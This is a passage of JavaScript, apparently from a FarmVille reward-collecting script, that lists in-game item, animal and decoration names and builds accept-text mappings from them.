				"black truffle","gold truffle","brown truffle","animal feed","fertilize all","sunshine dog treat",
				"cupcake dog treat","sturdy dog treat","sporty dog treat","mystery seedling","love potion","instagrow",
				"fuel","mystery gift","special delivery","unwither","capital one gift","turbo charger","double avatar",
				"gardener","mystery bulb","dog treat","coins","currency bundle","mystery game dart","pig chow","coconuts",
				"gopher treat",
				//don't know if this will work but we'll see
				" xp "," zp "," sp "," cp ",
			].fixOrder();
		
		var specialMaterials=["fruit cake","beach toys","apple","treats","tricks","bonfire supplies","holiday gifts",
				"stocking stuffer","snowman parts","token of affection","lucky charms","ice cream","picnic basket",
				"dream drop","time tonic","gem"].fixOrder();
				
		var	specialEvents=["dream vacation","perfect pet","charming vineyard","statue","perfect job","perfect costume",
				"fall fashion","shopping personality","holiday party style","new year's resolutions"].fixOrder();

		var craftingMaterials=["apple wood basket","walnut basket","orange basket","lemon basket","milk jug","wool bundle",
				"cherry basket","maple syrup basket","manure bag","poplar wood basket","poplar wood basket"].fixOrder();
				
		//removed all quest items and linked them to sendhelp
		var questItems=[];

		//merge materials for searching
		var materials=[].concat(standardMaterials,otherConsumables,craftingMaterials,specialMaterials,specialEvents).fixOrder();
		
		//collectibles for menu
		var colBerries=["fruit bar","sorbet","preserves","dried berry","berry basket"];
		var colCitrus=["bubble gum","juicer","sherbet","fruit wedge","cirtus peel"];
		var colCows=["cow bell","milking bucket","milking stool","milk bottle","more cowbell"];
		var colFlowers=["corsage","hummingbird","dried petals","butterfly","pollen"];
		var colGrains=["grindstone","scythe","bran","chaff","flour"];
		var colSquash=["pumpkin seeds","stuffed pasta","decorative gourds","yerba mate","sitar"];

		//merge collectibles for searching
		var colTypes=[].concat(colBerries,colCitrus,colCows,colFlowers,colGrains,colSquash).fixOrder();

		//collectible set names for collecting random items
		var colGroups=["Berries","Citrus","Cows","Flowers","Grains","Squash"];

		//getting back to animals
		var calfTypes=[//multiple words
				"candy cane","green patch","holiday wreath","lunar new year","pink patch","purple valentine","red brown",
				"western longhorn","yellow patch","mini longhorn","black shorthorn","milking shorthorn","gray jersey",
				"yellow referee","irish moiled","brown swiss","black angus","frankenstein bride","belgian blue","new year 2",
				"holiday lights","holiday top hat","snow blading","sport fan","lion dance","frosty fairy","cherry blossom",
				"fall fairy","welsh black","red heart","maple wreath","red poll","tea party","messy picnic","diving bell",
				"kelly green","new year","blue patch","cream pie","galician blond","ankole watusie","birthday white park",
				"white park","art deco","calfstruction worker","frog prince","southern belle","milky way","milking zebu",
				"milky way","ankole longhorn","bovine belle","real ca milk","texas longhorn","apple juice","red horned",
				"horse costume","bat hat","madam morgan","green apple","new wave","black holstein","in hoodie","in sweater",
				"rag doll","holiday dwarf","silver pega","christmas present","vintage deco","holiday light","pine cone",
				"snow battle","spotted holiday","hungry hungry","ugly sweater","balloon 2","jack frost","more 2 love",
				"crystals fairy","go lightly","green sweater","my fair lady",

				//single words
				"autumn","belted","chocolate","chrome","devon","dexter","disco","english","fan","flower","kerry",
				"gelbvieh","groovy","hereford","highland","cornucopia","criollo","snowflake","santa","telemark","caroling",
				"robot","simmental","tuscan","valentine","green","vineyard","fall","pineywoods","blue","canadienne","sailor",
				"shorthorn","b0v1n3-11","jersey","holstein","referee","guernsey","ayrshire","milky","brown","red","randall",
				"nightmare","skeleton","pumpkin","tourist","fairy","dragonfly","charolais","plush","flannel","pilgrim",
				"holiday","mohawk","neapolitan","panda","pink","purple","rainbow","icicle","sweater","frozen","judge","baby",
				"american","crystal","romance","romeo","vosges","cocoa","smitten","rose","carnival","headdress","aloha","luau",
				"lowline","caddy","cupcake","shark","leprechaun","hibiscus","orchid","lava","longhorn","winged","spring",
				"cracker","couture","mother","aurochs","natural","bovonia","jester","african","lavender","cloud","carabao",
				"cotton","bride","flapper","beach","dairy","mongolian","yakow","dragon","yanbian","kimono","balloon","cool",
				"firefly","ghengis","mayan","cheese","jade","astronaut","spanish","swiss","gaur","aubrac","captain","casanova",
				"earth","daisy","adventure","javelin","perennial","delicate","aromatic","flowering","budding","hologram","bulb",
				"fire","scholar","venus","chili","moon","constellation","vechur","pirate","frightened","chrysanths","foal",
				"glow-in-the-dark","wizard","beefalo","cornucalfpia","golfcourse","hustlin'","dzo","werewolf","disappear",
				"dracalfla","monster","rhinestone","vampire","bulltrina","woodland","treat","gourd","sugar","aquarium",
				"colonial","quilted","camilla","holly","spooky","abomidable","coco","costume","truffle","cider","glass",
				"kitchen","angel","elf","cleopatra","fur","toy","fireworks","caroler","meow","dewdrop",
			].fixOrder();
		
		var oxenTypes=["black ox","blue ox","grey oxen","red devon ox","baby ox"].fixOrder();
		
		var bullTypes=["pink patch bull","holstein bull","randall bull","irish moiled bull","flower bull","wagyu bull",
				"groom bull","black rose bull","holiday bull","peppery bull","wall street bull","dragon bull",
				
				"bull",
			].fixOrder();
		
		//combines all calves to one array for easy searching
		var allCalves=[].concat(calfTypes,bullTypes,oxenTypes).fixOrder();
				
		var yakTypes=["gray baby","black baby","baby"].fixOrder();

		var foalTypes=[//mini
				"appaloosa mini","black mini","fall fairy mini","cream mini","french mini","mini candycane",
				"mini party","rainbow mini","stallion mini","valentine mini","vineyard mini","purple mini","fairy mini",
				"mini bat","buckskin mini","brown pinto mini","harvest mini","chestnut mini stallion","tinsel mini",
				"frosty mini","nightmare mini","snowflake mini","mini gold bell","frosted fairy mini","romance mini",
				"black rose mini","black cherry mini","mini rose","carnival mini","green saddle mini","shamrock mini",
				"aloha mini","orchid mini","mini apaloosa","buckskin mini","spring mini","hibiscus mini horse",
				"purple fairy mini","natural mini","coral mini","mini blue gypsy","pinto mini","carnation mini",
				"armored mini","cloud mini","jade mini","american mini","snorkel mini","australian stock",
				"golden stallion mini","golden mini","firefly mini","mini pirate","mini andalusian","mini pirate",
				"purple mini pegacorn","mini pegacorn","ghastly mini","ghost mini","pumpkin mini","maple mini",
				"skeleton mini","princess mini","violets mini","holly mini",

				//pegacorn
				"purple pegacorn","icy blue pegacorn","blue candy pegacorn","winter pegacorn","crystal pegacorn","pink pegacorn",
				"spring pegacorn","black cherry pegacorn","rainbow pegacorn","rose pegacorn","lava pegacorn","gem pegacorn",
				"cherry pegacorn","emerald pegacorn","glass pegacorn","wind pegacorn","lightning pegacorn","angel pegacorn",
				"icy fire pegacorn","phoenix pegacorn","fairy pegacorn","magical pegacorn","harvest pegacorn","golden pegacorn",
				"zebra pegacorn","maple pegacorn","steam pegacorn","black pegacorn","fake pegacorn","dracula pegacorn",
				"ghost pegacorn","nightmare pegacorn","princess pegacorn","butterfly pegacorn","lace pegacorn","festive pegacorn",
				"andalusian pegacorn","punk pegacorn","robot pegacorn","pumpkin pegacorn","dragonfly pegacorn","cloud pegacorn",
				"bedazzled pegacorn","rainbow pegapony","candy pegacorn","red wine pegacorn","corn pegacorn","ugly sweater pegacorn",
				"nutcracker pegacorn","egyptian pegacorn","glitter pegacorn","snow pegacorn","royal pegacorn","aurora pegacorn",
				"poinsettia pegacorn","light pegacorn","balloon pegacorn","party pegacorn","gem maiden pegacorn","roxey pegacorn",
				"pajama pegacorn","swan lake pegacorn","sweater pegacorn","water pegacorn","firefly pegacorn","dew pegacorn",
				
				//pegasus
				"chrome pegasus","lavender pegasus","mini zebra pegasus","white pegasus","candy corn pegasus","lava pegasus",
				"nightmare mini pegasus","nightmare pegasus","mini pegasus","maple pegasus","icy blue pegasus","rainbow pegasus",
				"snowflake pegasus","frozen pegasus","rose pegasus","pegasus pink","headdress pegasus","carnival pegasus",
				"shamrock pegasus","spring pegasus","athena pegasus","red carnation pegasus","friendship pegasus","pegasus",
				"aviator pegasus","glitter pegasus","constellation pegasus","fire pegasus","starry pegasus","ghost pegasus",
				"moon pegasus","sun pegasus","spectral pegasus","marigold pegasus","purple icicle pegasus",
				
				//unicorn
				"valentine unicorn","single unicorn","orchid unicorn","pink fairy unicorn","carnation unicorn",
				"rose unicorn","shamrock unicorn","hibiscus unicorn","cherry unicorn","pearl unicorn","butterfly unicorn",
				"nightmare blue unicorn","zebra unicorn","skeleton unicorn","dragonfly unicorn","crystal unicorn",
				"candycane unicorn","golden unicorn","holiday tinsel unicorn","frosted fairy unicorn","aurora unicorn",
				"candy corn unicorn","clover unicorn","pink unicorn","lady gaga unicorn","mexican unicorn","nightmare unicorn",
				"purple unicorn","white unicorn","yellow unicorn","white mini unicorn","fairy unicorn","french unicorn",
				"purple mini unicorn","black mini unicorn","winged unicorn","harvest unicorn","icy blue unicorn",
				"black unicorn","candycorn unicorn","carnival unicorn","aloha unicorn","spring unicorn","sea shell unicorn",
				"cloud unicorn","armored unicorn","camellia unicorn","dahlia unicorn","american unicorn","bedazzled unicorn",
				"rapunzel unicorn","alien unicorn","celtic unicorn","milky way unicorn","coral unicorn","ocean unicorn",
				"rainbow unicorn","sparky stars unicorn","tiara unicorn","robot unicorn","pirate unicorn","firefly unicorn",
				"moss unicorn","sun unicorn","starry night unicorn","pink lemonade unicorn","ballerina unicorn","moon unicorn",
				"fancy pants unicorn","princess unicorn","dream unicorn","star unicorn","neon unicorn","luxe gem unicorn",
				"gem unicorn","romance unicorn","wisteria unicorn","icy pink unicorn","glitter unicorn","sapphire unicorn",
				"amethyst unicorn","black rose unicorn","dracula unicorn","lava unicorn","pumpkin unicorn","web unicorn",
				"mohawk unicorn","purple star unicorn","skyline unicorn","silver unicorn","purple nightcorn","leopard unicorn",
				"orange butterflycorn","phoenix unicorn","cider unicorn","grape unicorn","glass unicorn","santa unicorn",
				"nutcracker unicorn","snowflake unicorn","ivy unicorn","dreamgirl unicorn","boho chic unicorn",
				"cosmopolitan unicorn","firework unicorn","more 2 love unicorn","steam unicorn",
				
				//-foal
				"fall pega","sugar pega","cheerful scroogi","pegaruldophi","life of the party pega","host pega","winter fun pega",
				"traveling pega","stay at home pega","valentine pega",
				
				//pony
				"black pony","blue pony","connemara pony","dales pony","dartmoor pony","disco pony","eriskay pony",
				"exmoor pony","golden pony","merens pony","pinto pony","pottok pony","rainbow pony","shamrock pony",
				"shetland pony","yakut pony","new forest pony","pink pony","purple pony","fairy pony","harvest pony",
				"walking pony","candy corn pony","nightmare pony","hackney palomino pony","dragonfly pony","grass pony",
				"icy blue pony","butterfly pony","tinsel pony","holiday wreath pony","holiday pony","golden bell pony",
				"snowflake pony","valentine pony","rose pony","smitten pony","black cherry pony","beaded pony","noma pony",
				"headdress pony","lucky pony","snorkeling pony","aloha pony","candy pony","daffodil pony","princess pony",
				"pink carnation pony","galloway pony","queen pony","java pony","mongolian pony","firefly pony","balloon pony",
				"rapunzel pony","kerry bog pony","sea star pony","boer pony","rubber pony","icy wizard pony","mummy pony",
				"dewsdrop pony","clara pony","diva pony","royal pony","frosty pony","pinata pony","pink balloon pony",
				"leg warmers pony",
				
				//multiple words
				"asian wild","bedazzled","black gypsy","black percheron","black shire","black stallion",
				"blue mane gypsy","blue ponytail","brown gypsy","candy cane","candy corn","cleveland bay","jet set",
				"clydesdale stallion","cream draft","french percheron","golden stallion","irish cob","white shire",
				"lunar new year","pink gypsy","pink ponytail","pink stallion","purple bedazzled","purple ponytail",
				"purple stallion","rainbow stallion","red pinto","royal steed","snow stallion","swiss warmblood",
				"white mustang","white thoroughbred","american quarter","irish hunter","gypsy stallion","new year",
				"white andalusian","fairy pink","black n white","arabian stallion","friesian stallion","frosty fairy",
				"new england pinto","morgan stallion","bay andalusian","spotted appaloosa","fire skeleton","high kick",
				"black belgian","cream stallion","pink saddled","candy corn stallion","trotter stallion","black arabian",
				"peruvian","black ponytail","glow skeleton","flowered","black dartmoor","hollow fairy","maple leaf",
				"autumn stallion","fall lantern","spotted draft","black paint","palomino quarter","jingle bells",
				"silver bell","fairy zebra","sugar plum fairy","white arabian","poinsettia","white snow fantasy",
				"black snow fantasy","a winter rug","icy pink","green caroling","dark cherrasus","dark cherrycorn",
				"black cherry","hawaiian shirt","rainbow body","pink aloha stallion","orchid stallion","dapple gypsy",
				"open road","candycane zebra","cotton candy","ice horse","bashkir curly","spring bonnet","may fair",
				"postier brenton","blue quarter","yellow rose","gypsy rainbow","gypsy daisy","mother's day",
				"spanish mustang","camargue stallion","art deco","ice cream","asian war","blue samurai","orlov trotter 2",
				"dutch draft","sancai ii","double rainbow","yellow butterfly","frog prince","dutch warmblood",
				"black tennessee","rocky mountain","florida cracker","spotted saddle","inner tube","irish sport",
				"plum blossom","summer night","sea star","brumby butler","wild burro","australian stock","bubble gum",
				"tie dye","pink fairy stallion","red rose","purple fairy","moon steed","american indian","orange juice",
				"zebra costume","pink skeleton","purple nightmare","black steed","samuari warrior","fire wizard",
				"purple batwing","franken bride","franken stallion","bewitched black","pure heart","silver batacorn",
				"tee pee","dole yellow","glow stick","half n half","black light","halloween partycorn","party game",
				"crystal ball","purple ghost","metal hair","celestial gypsy","white belgian","holiday drum",
				"winter magic","winter hollow","cotton candycorn","ice diamond","rainbow prism","holiday express",
				"holiday parade","gold angel horse","ice pixie","cheer ewe up","party tarpan","frosty clydesdale",
				"king tut","orlov trotter","sleigh ride","ugly sweater brumby","sparkling bubbly","christmas morning",
				"hot cocoa","ballet instructor","ugly sweater","holiday clydesdale","first wise","second wise",
				"third wise","frozen berry","winter fairycorn","winter elf","lilac fairy","festive elf","monchino monarch",

				//single words
				"butterflycorn",
				"appaloosa","breton","brown","black","white","gypsy","pinto","red","shire","morgan","fairy","zesty",
				"mustang","party","percheron","grey","green","forest","camargue","camarillo","carnival","charro","chrome",
				"clown","clydesdale","buckskin","falabella","fjord","hackney","haflinger","hanoverian","galiceno","icelandic",
				"king","knight","mongolian","paint","palouse","royal","saddle","silver","thoroughbred","valentine","pony",
				"welsh","vineyard","american","maremmano","standardbred","quarter","draft","andalusian","nightmare","pseudocorn",
				"spectator","brumby","trakehner","tennessee","batwing","comtois","apple","dapplegray","pumpkin","skeleton",
				"dragonfly","autumn","canadian","butterfly","reindeer","santa","harvest","plush","icy","armored","holiday","dole",
				"ornament","snowflake","wreath","caroling","glittering","tinsel","rainbow","nutcracker","disco","crystal","bird",
				"dragon","romance","cocoa","smitten","rose","auxois","shamrock","beaded","headdress","aloha","cremello","hawaiian",
				"princess","hibiscus","cherry","coral","lucky","chocolate","pearl","lava","friesian","mustache","caveman",
				"prehistorical","sundae","gem","banker","bunny","andravida","spring","sun","moon","yonaguni","akhal-teke",
				"natural","leopard","carnation","fancy","farmer","quagga","seashell","stargazer","suffolk","reitpony","cloud",
				"lavender","miniature","firefly","racer","bride","settling","camellia","fishing","hokkaido","kiang","kulan",
				"przwalski","samurai","summer","tropical","sunflower","jade","dream","pinata","noriker","amethyst","balloon",
				"lotus","terracotta","garden","alexandrite","fire","kimono","friendship","rainforest","nomadic","mayan",
				"bumblebee","star","vineyard","inspector","chateau","nokota","moyle","magnolia","robot","roman","racking",
				"chincoteague","kabardin","lokai","celtic","vanner","champion","dosanko","azteca","sea star","masquerade",
				"murgese","waler","water","packhorse","flower","wild","earth","endurance","outback","perennial","delicate",
				"neon","aromatic","flowering","bulb","budding","glitter","circus","safari","prism","crayon","rocking","jupiter",
				"apollo","celestial","wizard","pirate","student","ruby","sapphire","zorse","steam","walkaloosa","chrysanths",
				"haunted","topiary","night","dark","zombie","spectral","franken","thanks","buckingham","zebroid","hippie",
				"lantern","office","spooky","web","vamp","ash","edwardian","bat","sparkle","spider","music","blackberry","picado",
				"boss","leafy","sugar","saddlebred","sneaker","nightcap","boot","tin","borealis","harrietta","eugene","glittercorn",
				"unicornucopia","figurine","gingerbread","turkey","frostycorn","chef","cider","expedition","ropelight","joyful",
				"angel","gift","modern","express","stud","flowercorn","vintage","tapestry","toy","confetti","peace","nypd",
				"wrapped","giving","rudolphicorn","rudolph","spotted","flannel","graffiti","goblicorn","solacorn","lightning",
				"raindrop","shimmering","zephyr","leaf","dew","glen","sky",
			].fixOrder();
		
		var assTypes=["mini donkey","toy soldier donkey","african donkey","single donkey","spring donkey","mistle toe donkey",
				"trick or treat donkey","mule","summer donkey","vampire donkey","fairy donkey","donkey"
			].fixOrder();
		
		//combines all foals to one array for easy searching
		var allFoals=[].concat(foalTypes,assTypes).fixOrder();

		var horseTypes=["brown","gray","grey","flowered","cream draft","red pinto","red ","candy corn",
				"white snow fantasy","black snow fantasy","black","open road","jet set","buckskin mini",
				"sundae","farmer","fancy","postier brenton","nomadic","firefly","office","sparkle","spider",
				"giving","wrapped","vintage","modern",
			].fixOrder();

		var duckTypes=["belted","party","ugly","red-billed","red","brown","yellow","aztec","blue","campbell","cayuga",
				"chrome","crested","female mandarin","male mandarin","fulvous whistling","gadwell","goldeneye","golfer",
				"green mallard","green winged teal","indian runner","kungfu","longtail","muscovy","pekin","pochard",
				"princess","goldeneye","rainbow","robin","royal guard","ruddy","scoter","tufted","valentine","warder",
				"wizard","wood","orange","banjo","fighting irish","white grape","nerd","diving","hippie","goth","classic",
				"brand name",
			].fixOrder();

		var ducklingTypes=["ugly","red","brown","yellow","blue"].fixOrder();

		var pigTypes=["poolside","black","hot pink","ossabaw","pink pot belly","strawberry","white","ghost","snow flake","muddy",
				"mudhole","maid","picasso"];

		var sheepTypes=["miner","mouflon","polka dots","red","scuba","flower","clover","shamrock","spaghetti","vineyard",
				"scared","luv","thank","sunny","schooled","caroling","star bright","smitten","dwarf blue","white ninja",
				"connoisseur","emerald","count on","groomed","chocolate","fruity"
			].fixOrder();

		var cowTypes=["brown","chocolate","dexter","disco","fan","groovy","irish moiled","longhorn","pink patch",
				"pink","purple valentine","purple","yellow patch","green patch","milking shorthorn","pumpkin",
				"flannel","caroling","smitten","red","mini longhorn","ghengis","real ca milk","golfcourse","treat",
				"trick","caroling","jack frost",
			].fixOrder();
				
		var eggTypes=["white","brown","black","cornish","golden","rhode island red","scots grey","rainbow","candycane",
				"english","party","marans","faverolles","araucana","buttercup","candycorn","apple","fall fairy","new year",
				"tourist","snowflake","crystal","cupid","love","carnival","headress","cochin","aloha","green silkie","spa",
				"hawaiian","shamrock","ali-h3n-12","lava","sabertooth","strawberry fairy","bonnet","japanese bantam","wizard",
				"golden polish","mother","bresse","mystery cluck rogers","junglefowl","mandolin","jazz","hiking","zen","beach",
				"rocket","chabo","present","fortune cookie","american","orange","fairy tale","barnevelder","groundskeeper",
				"cluck rogers","gymnastics","jet pack","captain","masquerade","paradise","meditating","flowering","budding",
				"bulb","aromatic","delicate","perennial","adventure","sumo","environmentalist","student","chili","ceres",
				"chicken turkey","haunted","dragon","giant prairie","chicken chicken","dark","chickenpire","hammer","skeleton",
				"werechicken","mad hatter","fire","ice","tambourine","coruroy","farmer","giant jersey","egg in jeans","winter",
				"strawberry","chili light","prom chick","spectator","red sweater","floating","long john","partying",
			].fixOrder();
				
		var eggTypes2=["white bunny","yellow bunny","pink bunny","purple bunny","blue bunny","gold bunny"];
				
		//two word or common animal catch all texts
		var otherAnimals=["pink lamb","baby lamb","dorking chicken","persian cat","baby turkey",
				"clumsy reindeer","yellow sow","boer goat","white kitty","white-tailed buck","nightmare stallion",
				"himalayan kitty","black kitten","wfh turtle","clover rabbit","baby bourbon turkey","english spot rabbit",
				"rhode island red chicken","reindeer","dutch rabbit","poncho llama","white turkey","black rabbit",
				"white goose","white llama","red goat","mouflon goat","clover chicken","red toggenburg goat",
				"candycorn unicorn","black pony","white mustang","arctic rabbit","winter fox","mistletoe penguin",
				"winter polar bear","elf penguin","red nose sheep","caroling goat","nutcracker stallion","aurora cat",
				"aurora unicorn","light blue pony","holiday st bernard","snow leopard","smitten stallion","diamond ewe",
				"gold floppy bunny","pink loppy bunny","purple puffy bunny","white daisy bunny","yellow chubby bunny",
				"blue lily bunny","rainbow body mustang","large parrot","big blue tang fish","lesser flamingo",
				"striped possum","treasure seagull","river float pug","accountant dog","spa bear","safari bear",
				"blue dot elephant","ice cream dragon","hopper from dish","spotted lop rabbit","halloween tutu hippo",
				"tiki mask turtle","american bobtail","american bulldog","marathon tortoise","marathon hare","farm goose",
				"harbor seal","flower bull","ringtail","red giraffe","blue winged teal","merle corgi","brachiosaurus",
				"carnotaurus","chateau stallion","vineyard steed","red grape rabbit","gardener chicken","gallimimus",
				"coelophysis","chinchilla","dream unicorn","rose dragon","summer donkey","zebra giraffe","tennis retriever",
				"crown of thorns starfish","juggler monkey","navy fuschia spotted turtle","amethyst unicorn","sapphire unicorn",
				"danomire dragon","arajir dragon","tabby persian","furilich dragon","etterius dragon","tselius dragon",
				"australian cattle dog","black and grey ocelot","thinker monkey","brown silverback","domestic shorthair",
				"ostrich pilot","hammer chicken","night owl","early bird","suit monkey","vampire donkey","fairy donkey",
				"party game unicorn","sugar dragon","fire chicken","ice chicken","bat pegacorn","butterfly pegacorn",
				"moon pegasus","sun pegasus","messenger bag turtle","lemon dragon","bootcut ostrich","butterflycorn",
				"puffy jacket puffin","backpack turtle","duck with gloves","duck with mittens","peacoat penguin",
				"skinny jeans ostrich","fedora fox terrier","corduroy chicken","beanie fox terrier","browsing monkey",
				"shopper tiger","use it seal","collector seal","walleye","party bear","bulk order ostrich",
				"ugly sweater bear","life of the party pegacorn","host pegacorn","sly rabbit","single order ostrich",
	
				"turtle","penguin",
			].fixOrder();
				
		//baby animals that aren't calves or foals
		var babyAnimals=["baby goat","baby groundhog","red wolf","coyote pup","wolf cub","brown kitten","baby alpaca","white wolf",
				"baby penguin","white kodiak cub","baby turkey","baby zebra","andean bear cub","baby valentine giraffe","black bear cub",
				"clever cub","lil pink peacock","romeo cub","trick or treat bear","jaguar cub","baby tiger","siberian tiger cub",
				"nutcracker ballerina cub","panther cub","white lion cub","baby bobcat","baby monkey","flower mane cub","baby seal",
				"spring puppy","bear cub","brown baby elephant","baby elephant","brown kitten","deer fawn","red fox kit","gray fox kit",
				"lion cub","baby dragon","kodiak cub","baby white penguin","baby winter seal","baby llama","baby carnival elephant",
				"fall fawn","baby giraffe","candy kid",
			].fixOrder();
				
		var avatar=["spontaneous adventurer","casual traveler","pampered princess","practical lounger","sensible sunbather",
				"outdoor explorer","wild spirit","teddy bear","koala","cat","hamster","dog","monkey","lion","tiger"].fixOrder();
				
		var dnaTypes=["red","blue","green","orange","yellow","purple"];
		var gemTypes=["purple amethyst","white diamond","green emerald","red ruby","blue sapphire"];
		var scaleTypes=["blue","green","orange","purple","red","yellow"];
		var serumTypes=["blue","green","orange","pink","purple","yellow"];
		var cuttingTypes=["green","red","pink","purple","yellow"];
		var spiritTypes=["blue","green","pink","purple","yellow"];
		var fossilTypes=["amber","black","gray","red","wood"];
		var pixieTypes=["blue","green","orange","white","yellow"];
	
		var bulbTypes=["anemone","damask rose","fire sunflower","fire weed","orange tulip","pink boat orchid","purple carnation",
				"purple petunia","soho oriental poppy","tiger lily","white daisy","white lily","yellow pansy","pink hollyhock",
				"flame azalea","fairy flower","golden rose","pyramidial orchid","kerry lily","groundsel","pink gladiolas",
				"purple aster","cardinal flower","hydrangea","purple primrose","desert rose","royal bluebell","golden wattle",
				"pink daisies","yellow gerbera","red rose","orange zinnia","yellow buttercup","pink tulip","bird of paradise",
				"sprite flower","wild indigo","lavender","pink carnation","lady slipper","impala lily","leopard orchid",
				"african daisies","red clover","golden lotus","magical flower","bluets","evening primrose","mountain laurel",
				"rose quartz bloom","chinese bellflower","helenium","fall corcus","piranha bloom","black orchid","mandrake",
				"pumpkin flower","spider flower","witchhazel","wolfsbane","black hollyhock bloom","hemlock bloom","black rose",
				"orange chrysanths","bat face cuphea","marigold","pat de leon","skull cap","candy corn","cosmos","baby's breath",
				"blackberry lily","forget me not","sweet pea","narcissus","orange mums","purple-ranunculus","silver poinsettia bloom",
				"amaryllis","anemone","aster","black-eyed susan vine","casa blanca lily","poinsettia",
			].fixOrder();
				
		//contains the main list of "other" things you can collect
		//decorations by event
		var decorApples=["autumn fireplace","harvest gnome","fall flowerbed","apple barrel"];
		
		var decorHalloween=["pumpkin topiary","candied gnome","skele-scarecrow","bat tree","pumpkin house",
				"mini jack-o'lantern","pumpkin terrier","halloween pond","headless horseman gnome","cobwebbed tree"];
		
		var decorThanksgiving=["harvest surprise","pilgrim gnome","harvest fountain","mayflower",
				"railroad tie bench","bare tree decoration","iron fire pit","corn maze fence"];
		
		var decorChristmas=["silver nutcracker","holly arch","holiday bear","ice sculpture","snowflake pole",
				"snow drift","horse snowglobe","lighted hedge","caroling snowman","teddy bear snowglobe","giant candy",
				"white soldier","icy snowflake","frosty snowflake","blue soldier","silver ornament","gold ornament",
				"gold soldier","cocoa bear","snow drift","snow pile","gold nutcracker","cream bear","luminary fence",
				"frozen fountain","string lights","holly fence"].fixOrder();
		
		var decorHolidayHearth=["forest snowglobe","holiday carousel","gift giving gnome","north pole gnome","cupcake factory"];
		
		var decorMagicSnowman=["aurora fence","starry pond"];
		
		var decorWinterWonderland=["candy cane decoration","single candle","ice cube","lighted fence","holiday planter",
				"giant snowflake 1","reindeer balloon","snowy track i","snowy track ii","snowy track iii","snowy track iv",
				"snowy track v","snowy forest","winter cafe","santa's sleigh","gift mountain","winter cottage","ice castle",
				"toy factory"];
		
		var decorValentines=["red heart hay","yellow rose stand","fancy carriage","giant teddy","valentine ram",
				"pecking ducks","3 hearts fountain","pink patch cow","chocolate fountain","eiffel tower","pink swan",
				"i love you stand","i love you sign","xoxo sign","purple hay bale","heart teddy","caramel bear",
				"fuchsia greenery","pink greenery","provencal pot","fancy topiary","flax plant","love balloon",
				"heart rose bed","swan pond"].fixOrder();
				
		var decorStPatty=["kelly green hay","clover gnome","lucky fountain","green lighthouse","spring flower cart",
				"spring pond","shamrock castle","rainbow clover bridge","shamrock streetlight","irish pub"];
				
		var decorEaster=["mystery egg","bunny gnome","gilded egg","dutch windmill","pastel hay bale",
				"flower bucket","little wagon","spring flowers","milk crate","azalea","stone archway",
				"spring balloon arch","weather vane","fruit crate","bouncing horse","waffle fence",
				"chocolate syrup waterfall","ice cream gnome"];
				
		var decorShovels=["mole","crystal rock","cave gnome","antique tractor"];
		
		var decorSchoolSupplies=["haiti flag","student gnome","tap tap bus","school seesaw","school house"];
		
		var decorTuscanWedding=["wedding cake","pig high art","apollo butterfly","bella fountain","leaning tower"];
		
		var decorWishingWell=["nightingale","leprechaun gnome","irish cottage","double-deck tractor"];
		
		var decorFlowers=["spring arch","flower fountain","flower tower"];
		
		var decorSandCastle=["beach umbrella","beach chair","beach hut","lifeguard tower"];
		
		var decorFV2Birthday=["doghouse","cowprint balloon arch","lamppost","blue bird","bird bath fountain","garden shelter",
				"bicycle planter","ivy archway","bench planter","FV haybale"];
		
		var decorGnomes=["chef gnome","bacchus gnome","spa gnome","elf gnome","waiter gnome","picnic gnome","tiki totem gnome",
				"artist gnome","jock gnome","zen gnome","bbq gnome","fruit basket gnome","employee gnome","earful gnome",
				"entrepreneur gnome","monkey gnome","yappy gnome","ghost gnome","sad clown gnome","county fair gnome",
				"yappy gnome","diva gnome","independent gnome","valet gnome","vintnor gnome","whoopie cushion gnome",
				"holiday baker gnome",
		];
		
		var decorOther=["japanese relief flag","fireworks","english hat","hanging flowers","japanese trellis","warrior i",
				"pot of english rose","aster flower fence","flowerbed","picnic set","white willow","animated butterfly",
				"green gazing ball","small pond","french air balloon","lunchbox","parisian bench ii","flower truck",
				"lighted tiki torch","hanging flower","surfboard","giant maracija","hydrangea","mangrove tree","gem barn",
				"outdoor spa pool","swimming hole","blue lawn chair","coral fence","neon building","suburban cottage",
				"yellow mums","pink mums","sakura flower","yellow dome","dragon arch","peeking ducks","japanese trellis",
				"enchanted tree ii","oak barrel rack","grape crushing barrel","fairy rose","jumping fountain","rainbow barrel",
				"arborist flag","farmhand flag","sapphire fountain","mystical unicorn","local boutique","shopping bear",
				"free shipping bear","mall rat","all day owl","in and out hog","christmas toy shop","trickster toy shop",
				"holiday birdhouse","jolly snowman","laughing snowman","quiet toast","countdown crowd",
		];
				
		// merge decorations for searching
		var decorTypes=[].concat(decorHalloween,decorThanksgiving,decorChristmas,decorValentines,decorStPatty,
				decorEaster,decorWinterWonderland,decorShovels,decorSchoolSupplies,decorTuscanWedding,
				decorWishingWell,decorFlowers,decorSandCastle,decorFV2Birthday,decorApples,decorOther,
				decorHolidayHearth,decorMagicSnowman,decorGnomes).fixOrder();

		//this animal catchall is for words that already appear earlier, and so must be searched AFTER horses, foals, materials or decorations
		var animalCatchalls=["chicken","turkey","llama","cow","horse","sheep","pig",
				"rabbit","boar","duckling","duck","foal","calf","ram","raccoon","porcupine","goat"].fixOrder();

		//catchall for other items not listed as materials
		var otherWords=["lucky penn","raffle ticket"];

		//dynamically build accept texts from the arrays above
		var t1 = createAccTextFromArray([].concat(otherWords,decorTypes,materials),"","");
		var t2 = createAccTextFromArray(allCalves,"adopt_calf"," Calf");
		var t3 = createAccTextFromArray(allFoals,"adopt_foal"," Foal");
		var t31 = createAccTextFromArray(yakTypes,"adopt_yak"," Yak");
		var t4 = createAccTextFromArray(horseTypes,"adopt_horse"," Horse");
		var t5 = createAccTextFromArray(bushelTypes,"bushel_"," Bushel");
		var t6 = createAccTextFromArray(flowerTypes,"perfect_"," Bunch");
		var t7 = createAccTextFromArray(treeTypes,"tree_"," Tree");
		var t8 = createAccTextFromArray(treeTypes2,"tree_giant"," Tree (Giant)");
		var t34 = createAccTextFromArray(treeTypes3,"tree_bonsai"," Tree (Bonsai)");
		var	t9 = createAccTextFromArray(craftShop,"join"," Team");
	//	var t9 = createAccTextFromArray(craftTypes,"sample_"," Sample");
		var t10 = createAccTextFromArray(colTypes,"col_"," Collectible");
		var t11 = createAccTextFromArray(colGroups,"colX_"," Collectible");
		var t12 = createAccTextFromArray(duckTypes,"adopt_duck"," Duck");
		var t13 = createAccTextFromArray(ducklingTypes,"adopt_duckling"," Duckling");
		var t14 = createAccTextFromArray(pigTypes,"adopt_pig"," Pig");
		var t15 = createAccTextFromArray(sheepTypes,"adopt_sheep"," Sheep");
